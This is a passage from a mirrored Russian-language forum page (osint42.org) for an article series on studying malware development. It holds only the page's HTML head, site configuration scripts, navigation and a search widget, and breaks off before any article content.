<!DOCTYPE html>
<html id="XF" lang="ru-RU" dir="LTR"
	data-xf="2.3"
	data-app="public"
	data-variation="alternate"
	data-color-scheme="dark"
	data-template="xa_ams_article_view"
	data-container-key="amsCategory-2"
	data-content-key=""
	data-logged-in="false"
	data-cookie-prefix="xf_"
	data-csrf="1758965544,d4a329dfc08dc36ef8d644381e10fee9"
	class="has-no-js template-xa_ams_article_view"
	>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/?full=1 by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:43:13 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
	<link rel="icon" href="../../favicon.ico" type="image/x-icon">
	
	
	

	<meta charset="utf-8" />
	<title>Цикл статей &quot;Изучение вредоносных программ&quot; | Osint42.Org - Безопасность и код</title>
	<link rel="manifest" crossorigin="use-credentials" href="../../webmanifest.php">

	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">

	
		
			<meta name="theme-color" content="#0a1c29" />
		
	

	<meta name="apple-mobile-web-app-title" content="Osint42.Org - Безопасность и код">
	
		<link rel="apple-touch-icon" href="../../data/assets/logo/192192.png">
		

	
		
		<meta property="og:title" content="Цикл статей &quot;Изучение вредоносных программ&quot;" />
		<meta property="twitter:title" content="Цикл статей &quot;Изучение вредоносных программ&quot;" />
	
	
		
		<meta name="description" content="Всем привет!

Решил перепостить свой цикл статей по разработки малвари.

Статьи будут оформлены в виде цикла статей.)

Зачем изучать разработку вредоносных..." />
		<meta property="og:description" content="Всем привет!

Решил перепостить свой цикл статей по разработки малвари.

Статьи будут оформлены в виде цикла статей.)

Зачем изучать разработку вредоносных программ ?

Есть несколько причин, по которым кто-то хотел бы изучить разработку..." />
		<meta property="twitter:description" content="Всем привет!

Решил перепостить свой цикл статей по разработки малвари.

Статьи будут оформлены в виде цикла статей.)

Зачем изучать разработку вредоносных программ ?

Есть несколько причин, по..." />
	
	
		<meta property="og:type" content="article" />
	
		<meta property="og:url" content="index.html" />
	
		<link rel="canonical" href="index.html" />
	
		
		<meta property="og:image" content="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png" />
		<meta property="twitter:image" content="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png" />
		<meta property="twitter:card" content="summary_large_image" />
	
	

	
		
	
	
	<meta property="og:site_name" content="Osint42.Org - Безопасность и код" />


	
	
	
	
	
	

	
	
	
		
	
	

	<link rel="stylesheet" href="../../cssf1bd.css?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Avariations.less%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=650febe17d52673553ff8fcab924bc52ae7c26c5" />

	<link rel="stylesheet" href="../../css3cbc.css?css=public%3Aalnb_navigation.less%2Cpublic%3Abb_code.less%2Cpublic%3Aembed_resolver.less%2Cpublic%3Alightbox.less%2Cpublic%3Amessage.less%2Cpublic%3Anotices.less%2Cpublic%3Ashare_controls.less%2Cpublic%3Axa_ams.less%2Cpublic%3Axa_ams_comment.less%2Cpublic%3Aextra.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=660f70198796b016e2fbc3737c197c9184e8d7a3" />


	
		<script data-cfasync="false" src="../../js/xf/preamble.minf74f.js?_v=01eb82fa"></script>
	

	
	<script data-cfasync="false" src="../../js/vendor/vendor-compiledf74f.js?_v=01eb82fa" defer></script>
	<script data-cfasync="false" src="../../js/xf/core-compiledf74f.js?_v=01eb82fa" defer></script>

	<script data-cfasync="false">
		XF.ready(() =>
		{
			XF.extendObject(true, XF.config, {
				// 
				userId: 0,
				enablePush: true,
				pushAppServerKey: 'BA479YFsUh5Dh5bOkTEWM7LoORrEgUroE2adYpgA6_NLt6AmfJFBdCBxt_i9NhpAIXJviINVU4JDqWxez0NnB-w',
				url: {
					fullBase: 'https://osint42.org/',
					basePath: '/',
					css: '/css.php?css=__SENTINEL__&s=1&l=2&d=1758392320',
					js: '/js/__SENTINEL__?_v=01eb82fa',
					icon: '/data/local/icons/__VARIANT__.svg?v=1757401797#__NAME__',
					iconInline: '/styles/fa/__VARIANT__/__NAME__.svg?v=5.15.3',
					keepAlive: '/login/keep-alive'
				},
				cookie: {
					path: '/',
					domain: '',
					prefix: 'xf_',
					secure: true,
					consentMode: 'disabled',
					consented: ["optional","_third_party"]
				},
				cacheKey: '60356f7aa4f82ca98e605b4e87a0a057',
				csrf: '1758965544,d4a329dfc08dc36ef8d644381e10fee9',
				js: {"\/js\/xf\/lightbox-compiled.js?_v=01eb82fa":true,"\/js\/xf\/code_block-compiled.js?_v=01eb82fa":true,"\/js\/copycode\/copycode.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/4.4.1\/socket.io.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/socket-conv.min.js?_v=01eb82fa":true},
				fullJs: false,
				css: {"public:alnb_navigation.less":true,"public:bb_code.less":true,"public:embed_resolver.less":true,"public:lightbox.less":true,"public:message.less":true,"public:notices.less":true,"public:share_controls.less":true,"public:xa_ams.less":true,"public:xa_ams_comment.less":true,"public:extra.less":true},
				time: {
					now: 1758965544,
					today: 1758920400,
					todayDow: 6,
					tomorrow: 1759006800,
					yesterday: 1758834000,
					week: 1758402000,
					month: 1756674000,
					year: 1735678800
				},
				style: {
					light: 'default',
					dark: 'alternate',
					defaultColorScheme: 'light'
				},
				borderSizeFeature: '3px',
				fontAwesomeWeight: 'r',
				enableRtnProtect: true,
				
				enableFormSubmitSticky: true,
				imageOptimization: '0',
				imageOptimizationQuality: 0.85,
				uploadMaxFilesize: 3145728,
				uploadMaxWidth: 0,
				uploadMaxHeight: 0,
				allowedVideoExtensions: ["m4v","mov","mp4","mp4v","mpeg","mpg","ogv","webm"],
				allowedAudioExtensions: ["mp3","opus","ogg","wav"],
				shortcodeToEmoji: true,
				visitorCounts: {
					conversations_unread: '0',
					alerts_unviewed: '0',
					total_unread: '0',
					title_count: true,
					icon_indicator: true
				},
				jsMt: {"xf\/action.js":"dc2375bf","xf\/embed.js":"d3d00259","xf\/form.js":"d3d00259","xf\/structure.js":"dc2375bf","xf\/tooltip.js":"d3d00259"},
				jsState: {},
				publicMetadataLogoUrl: 'https://osint42.org/data/assets/logo/192192.png',
				publicPushBadgeUrl: 'https://osint42.org/styles/default/xenforo/bell.png'
			})

			XF.extendObject(XF.phrases, {
				// 
"svStandardLib_time.day": "{count} day",
"svStandardLib_time.days": "{count} дней",
"svStandardLib_time.hour": "{count} hour",
"svStandardLib_time.hours": "{count} часов",
"svStandardLib_time.minute": "{count} минут",
"svStandardLib_time.minutes": "{count} минут",
"svStandardLib_time.month": "{count} month",
"svStandardLib_time.months": "{count} месяцев",
"svStandardLib_time.second": "{count} second",
"svStandardLib_time.seconds": "{count} секунд",
"svStandardLib_time.week": "time.week",
"svStandardLib_time.weeks": "{count} недель",
"svStandardLib_time.year": "{count} year",
"svStandardLib_time.years": "{count} лет",
copy_to_clipboard: "Скопировать в буфер обмена",
text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
				date_x_at_time_y:     "{date} в {time}",
				day_x_at_time_y:      "{day} в {time}",
				yesterday_at_x:       "Вчера в {time}",
				x_minutes_ago:        "{minutes} мин. назад",
				one_minute_ago:       "Минуту назад",
				a_moment_ago:         "Только что",
				today_at_x:           "Сегодня в {time}",
				in_a_moment:          "Через секунду",
				in_a_minute:          "Через минуту",
				in_x_minutes:         "Через {minutes} мин.",
				later_today_at_x:     "Сегодня в {time}",
				tomorrow_at_x:        "Завтра в {time}",
				short_date_x_minutes: "{minutes} м.",
				short_date_x_hours:   "{hours} ч.",
				short_date_x_days:    "{days} д.",

				day0: "Воскресенье",
				day1: "Понедельник",
				day2: "Вторник",
				day3: "Среда",
				day4: "Четверг",
				day5: "Пятница",
				day6: "Суббота",

				dayShort0: "Вс",
				dayShort1: "Пн",
				dayShort2: "Вт",
				dayShort3: "Ср",
				dayShort4: "Чт",
				dayShort5: "Пт",
				dayShort6: "Сб",

				month0: "Январь",
				month1: "Февраль",
				month2: "Март",
				month3: "Апрель",
				month4: "Май",
				month5: "Июнь",
				month6: "Июль",
				month7: "Август",
				month8: "Сентябрь",
				month9: "Октябрь",
				month10: "Ноябрь",
				month11: "Декабрь",

				active_user_changed_reload_page: "Ваша сессия истекла. Перезагрузите страницу.",
				server_did_not_respond_in_time_try_again: "Сервер не ответил вовремя. Пожалуйста, попробуйте снова.",
				oops_we_ran_into_some_problems: "Упс! Мы столкнулись с некоторыми проблемами.",
				oops_we_ran_into_some_problems_more_details_console: "Упс! Мы столкнулись с некоторыми проблемами. Пожалуйста, попробуйте позже. Более детальную информацию об ошибке Вы можете посмотреть в консоли браузера",
				file_too_large_to_upload: "Файл слишком большой для загрузки.",
				uploaded_file_is_too_large_for_server_to_process: "Загружаемый файл слишком большой для обработки сервером.",
				files_being_uploaded_are_you_sure: "Файлы ещё загружаются. Вы уверены, что хотите отправить эту форму?",
				attach: "Прикрепить файлы",
				rich_text_box: "Текстовое поле с поддержкой форматирования",
				close: "Закрыть",
				link_copied_to_clipboard: "Ссылка скопирована в буфер обмена.",
				text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
				loading: "Загрузка...",
				you_have_exceeded_maximum_number_of_selectable_items: "Вы превысили максимальное количество выбираемых элементов.",

				processing: "Обработка",
				'processing...': "Обработка...",

				showing_x_of_y_items: "Показано {count} из {total} элементов",
				showing_all_items: "Показаны все элементы",
				no_items_to_display: "Нет элементов для отображения",

				number_button_up: "Увеличить",
				number_button_down: "Уменьшить",

				push_enable_notification_title: "Push-уведомления для сайта Osint42.Org - Безопасность и код успешно включены",
				push_enable_notification_body: "Спасибо за включение push-уведомлений!",

				pull_down_to_refresh: "Потяните вниз для обновления",
				release_to_refresh: "Отпустите для обновления",
				refreshing: "Обновление..."
			})
		})
	

window.addEventListener('DOMContentLoaded',()=>{XF.Push.updateUserSubscriptionParent=XF.Push.updateUserSubscription;XF.Push.updateUserSubscription=function(b,a){"unsubscribe"===a&&XF.browser.safari&&XF.Push.setPushHistoryUserIds({});XF.Push.updateUserSubscriptionParent(b,a)}});
</script>

	<script data-cfasync="false" src="../../js/xf/lightbox-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/xf/code_block-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/copycode/copycode.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/DCom/LiveContent/4.4.1/socket.io.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/DCom/LiveContent/socket-conv.minf74f.js?_v=01eb82fa" defer></script>



	
		<link rel="icon" type="image/png" href="../../data/assets/logo/favicon.png" sizes="32x32" />
	

	
	
</head>
<body data-template="xa_ams_article_view">

<div class="p-pageWrapper" id="top">

	

	<header class="p-header" id="header">
		<div class="p-header-inner">
			<div class="p-header-content">
				<div class="p-header-logo p-header-logo--image">
					<a href="../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;}}">
		
		
		

		

		<img src="../../data/assets/logo_alternate/osint4242.png" srcset="/data/assets/logo_alternate/osint4242.png 2x" width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
	</picture>


					</a>
				</div>

				
			</div>
		</div>
	</header>

	
	

	
		<div class="p-navSticky p-navSticky--primary" data-xf-init="sticky-header">
			
		<nav class="p-nav">
			<div class="p-nav-inner">
				<button type="button" class="button button--plain p-nav-menuTrigger" data-xf-click="off-canvas" data-menu=".js-headerOffCanvasMenu" tabindex="0" aria-label="Меню"><span class="button-text">
					<i aria-hidden="true"></i>
				</span></button>

				<div class="p-nav-smallLogo">
					<a href="../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:null},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:null}}">
		
		
		

		

		<img src="../../data/assets/logo_alternate/osint4242.png"  width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
	</picture>


					</a>
				</div>

				<div class="p-nav-scroller hScroller" data-xf-init="h-scroller" data-auto-scroll=".p-navEl.is-selected">
					<div class="hScroller-scroll">
						<ul class="p-nav-list js-offCanvasNavSource">
							
								<li>
									
	<div class="p-navEl is-selected" data-has-children="true">
	

		
	
	<a href="../../index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xa_ams">Статьи</a>


		<a data-xf-key="1"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewArticles">Новые статьи</a>

	

				
					
	
	
	<a href="../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewComments">Новые комментарии</a>

	

				
					
	
	
	<a href="../authors/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xa_amsAuthorList">Список авторов</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../forums/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="forums">Форум</a>


		<a data-xf-key="2"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="newPosts">Новые сообщения</a>

	

				
					
	
	
	<a href="../../search/index4009.html?type=post"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="searchForums">Поиск по форуму</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../whats-new/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="whatsNew">Что нового</a>


		<a data-xf-key="3"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="whatsNewPosts">Новые сообщения</a>

	

				
					
	
	
	<a href="../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewNewArticles">Новые статьи</a>

	

				
					
	
	
	<a href="../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgWhatsNewNewMedia">Новые медиа</a>

	

				
					
	
	
	<a href="../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewArticleComments">Новые комментарии к статье</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../media/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xfmg">Медиа</a>


		<a data-xf-key="4"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewMedia">Новые медиа</a>

	

				
					
	
	
	<a href="../../whats-new/media-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewComments">Новые комментарии</a>

	

				
					
	
	
	<a href="../../search/index4784.html?type=xfmg_media"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xfmgSearchMedia">Поиск медиа</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="https://osint42.org/members/"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="members">Пользователи</a>


		<a data-xf-key="5"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="https://osint42.org/online/"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="currentVisitors">Сейчас на форуме</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>

				<div class="p-nav-opposite">
					<div class="p-navgroup p-account p-navgroup--guest">
						
							<a href="../../login/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--logIn"
								data-xf-click="overlay" data-follow-redirects="on">
								<span class="p-navgroup-linkText">Вход</span>
							</a>
							
								<a href="../../register/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--register"
									data-xf-click="overlay" data-follow-redirects="on">
									<span class="p-navgroup-linkText">Регистрация</span>
								</a>
							
						
					</div>
					
					
    <a href="https://osint42.org/misc/style-variation"
       class="p-navgroup-link p-navgroup-link--iconic js-styleVariationsLink"
       data-xf-click="menu"
       data-menu-pos-ref="< .p-navgroup"
       aria-label=" Выбор стиля"
       aria-expanded="false"
       aria-haspopup="true"
       title=" Выбор стиля">
        <i aria-hidden="true">
            <i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
        </i>
        <span class="p-navgroup-linkText"> Выбор стиля</span>
    </a>

    <div class="menu menu--structural" data-menu="menu" aria-hidden="true">
        <div class="menu-content js-styleVariationsMenu">
            

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			Системный
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			Светлый
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			Тёмный
		
	</a>

	

	
		
	

        </div>
    </div>



					<div class="p-navgroup p-discovery">
						<a href="../../whats-new/index.html"
							

	class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--whatsnew"

							aria-label="Что нового"
							title="Что нового">
							<i aria-hidden="true"></i>
							<span class="p-navgroup-linkText">Что нового</span>
						</a>

						
							<a href="../../search/index.html"
								class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--search"
								data-xf-click="menu"
								data-xf-key="/"
								aria-label="Поиск"
								aria-expanded="false"
								aria-haspopup="true"
								title="Поиск">
								<i aria-hidden="true"></i>
								<span class="p-navgroup-linkText">Поиск</span>
							</a>
							<div class="menu menu--structural menu--wide" data-menu="menu" aria-hidden="true">
								<form action="https://osint42.org/search/search" method="post"
									class="menu-content"
									data-xf-init="quick-search">

									<h3 class="menu-header">Поиск</h3>
									
									<div class="menu-row">
										
											<div class="inputGroup inputGroup--joined">
												<input type="text" class="input" name="keywords" data-acurl="/search/auto-complete" placeholder="Поиск..." aria-label="Поиск" data-menu-autofocus="true" />
												
			<select name="constraints" class="js-quickSearch-constraint input" aria-label="Поиск в">
				<option value="">Везде</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;}">Статьи</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;,&quot;c&quot;:{&quot;categories&quot;:[2],&quot;child_categories&quot;:1}}">Эта категория</option>

			</select>
		
											</div>
										
									</div>

									
									<div class="menu-row">
										<label class="iconic"><input type="checkbox"  name="c[title_only]" value="1" /><i aria-hidden="true"></i><span class="iconic-label">Искать только в заголовках

													
													<span tabindex="0" role="button"
														data-xf-init="tooltip" data-trigger="hover focus click" title="Теги также будут учитываться">

														<i class="fa--xf far fa-question-circle  u-muted u-smaller"><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Примечание</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#question-circle"></use></svg></i>
													</span></span></label>

									</div>
									
									<div class="menu-row">
										<div class="inputGroup">
											<span class="inputGroup-text" id="ctrl_search_menu_by_member">Автор:</span>
											<input type="text" class="input" name="c[users]" data-xf-init="auto-complete" placeholder="Пользователь" aria-labelledby="ctrl_search_menu_by_member" />
										</div>
									</div>
									<div class="menu-footer">
									<span class="menu-footer-controls">
										<button type="submit" class="button button--icon button--icon--search button--primary"><i class="fa--xf far fa-search "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#search"></use></svg></i><span class="button-text">Найти</span></button>
										<button type="submit" class="button " name="from_search_menu"><span class="button-text">Расширенный поиск...</span></button>
									</span>
									</div>

									<input type="hidden" name="_xfToken" value="1758965544,d4a329dfc08dc36ef8d644381e10fee9" />
								</form>
							</div>
						
					</div>
				</div>
			</div>
		</nav>
	
		</div>
		
		
			<div class="p-sectionLinks">
				<div class="p-sectionLinks-inner hScroller" data-xf-init="h-scroller">
					<div class="hScroller-scroll">
						<ul class="p-sectionLinks-list">
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../whats-new/ams-articles/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+1"
	data-nav-id="xa_amsNewArticles">Новые статьи</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../whats-new/ams-comments/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+2"
	data-nav-id="xa_amsNewComments">Новые комментарии</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../authors/index.html"
	class="p-navEl-link "
	
	data-xf-key="alt+3"
	data-nav-id="xa_amsAuthorList">Список авторов</a>


		

		
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>
			</div>
			
	
		

	<div class="offCanvasMenu offCanvasMenu--nav js-headerOffCanvasMenu" data-menu="menu" aria-hidden="true" data-ocm-builder="navigation">
		<div class="offCanvasMenu-backdrop" data-menu-close="true"></div>
		<div class="offCanvasMenu-content">
			<div class="offCanvasMenu-header">
				Меню
				<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" aria-label="Закрыть"></a>
			</div>
			
				<div class="p-offCanvasRegisterLink">
					<div class="offCanvasMenu-linkHolder">
						<a href="../../login/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
							Вход
						</a>
					</div>
					<hr class="offCanvasMenu-separator" />
					
						<div class="offCanvasMenu-linkHolder">
							<a href="../../register/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
								Регистрация
							</a>
						</div>
						<hr class="offCanvasMenu-separator" />
					
				</div>
			
			<div class="js-offCanvasNavTarget"></div>
			<div class="offCanvasMenu-installBanner js-installPromptContainer" style="display: none;" data-xf-init="install-prompt">
				<div class="offCanvasMenu-installBanner-header">Установить приложение</div>
				<button type="button" class="button js-installPromptButton"><span class="button-text">Установить</span></button>
				<template class="js-installTemplateIOS">
					<div class="js-installTemplateContent">
						<div class="overlay-title">Как установить приложение на iOS</div>
						<div class="block-body">
							<div class="block-row">
								<p>
									Следуйте инструкциям в видео ниже, чтобы узнать, как установить наш сайт как веб-приложение на главный экран вашего устройства.
								</p>
								<p style="text-align: center">
									<video src="../../styles/default/xenforo/add_to_home_new.mp4"
										width="280" height="480" autoplay loop muted playsinline></video>
								</p>
								<p>
									<small><strong>Примечание:</strong> Эта функция может быть недоступна в некоторых браузерах.</small>
								</p>
							</div>
						</div>
					</div>
				</template>
			</div>
		</div>
	</div>

	<div class="p-body">
		<div class="p-body-inner">
			<!--XF:EXTRA_OUTPUT-->


			
				
	
		
		

		<ul class="notices notices--block  js-notices"
			data-xf-init="notices"
			data-type="block"
			data-scroll-interval="6">

			
				
	<li class="notice js-notice notice--primary notice--hasImage"
		data-notice-id="1"
		data-delay-duration="0"
		data-display-duration="0"
		data-auto-dismiss=""
		data-visibility="">

		
			<div class="notice-image"><img src="../../data/assets/notice_images/c7eb1746-6291-4d37-b72b-8e3b5cfd1303.png" alt="" /></div>
		
		<div class="notice-content">
			
			<div class="block"
     style="border:1px solid #ccc;
            border-radius:8px;
            padding:min(4vw,15px);
            background:var(--xf-contentBg);
            box-shadow:0 0 8px rgba(0,0,0,.1);
            width:100%;
            max-width:clamp(480px,90vw,1200px);
            margin:0 auto;
            box-sizing:border-box;
            overflow:hidden;">

  <div class="block-container">
    <h3 class="block-header"
        style="font-size:clamp(1rem,4vw,1.125rem);
               margin:0 0 10px 0;">
      📡 Контакты и поиск по сайту в Яндекс
    </h3>

    <div class="block-body" style="line-height:1.4;">

      <!-- Email -->
      <p style="margin:8px 0;">
        ✉️ Email:
        <a href="../../cdn-cgi/l/email-protection.html#7a13141c153a150913140e4e4854191517" style="color:#2ecc71;
                  font-weight:bold;
                  overflow-wrap:anywhere;
                  text-decoration:none;">
          <span class="__cf_email__" data-cfemail="3d54535b527d524e545349090f135e5250">[email&#160;protected]</span>
        </a>
      </p>

      <div class="ya-site-form ya-site-form_inited_no" data-bem="{&quot;action&quot;:&quot;https://yandex.ru/search/site/&quot;,&quot;arrow&quot;:false,&quot;bg&quot;:&quot;transparent&quot;,&quot;fontsize&quot;:12,&quot;fg&quot;:&quot;#000000&quot;,&quot;language&quot;:&quot;ru&quot;,&quot;logo&quot;:&quot;rb&quot;,&quot;publicname&quot;:&quot;Поиск по osint42.com&quot;,&quot;suggest&quot;:true,&quot;target&quot;:&quot;_blank&quot;,&quot;tld&quot;:&quot;ru&quot;,&quot;type&quot;:2,&quot;usebigdictionary&quot;:true,&quot;searchid&quot;:13900241,&quot;input_fg&quot;:&quot;#000000&quot;,&quot;input_bg&quot;:&quot;#ffffff&quot;,&quot;input_fontStyle&quot;:&quot;normal&quot;,&quot;input_fontWeight&quot;:&quot;normal&quot;,&quot;input_placeholder&quot;:&quot;Поиск по сайту в Яндекс&quot;,&quot;input_placeholderColor&quot;:&quot;#000000&quot;,&quot;input_borderColor&quot;:&quot;#7f9db9&quot;}"><form action="https://yandex.ru/search/site/" method="get" target="_blank" accept-charset="utf-8"><input type="hidden" name="searchid" value="13900241"/><input type="hidden" name="l10n" value="ru"/><input type="hidden" name="reqenc" value=""/><input type="search" name="text" value=""/><input type="submit" value="Найти"/></form></div><style type="text/css">.ya-page_js_yes .ya-site-form_inited_no { display: none; }</style><script type="text/javascript">(function(w,d,c){var s=d.createElement('script'),h=d.getElementsByTagName('script')[0],e=d.documentElement;if((' '+e.className+' ').indexOf(' ya-page_js_yes ')===-1){e.className+=' 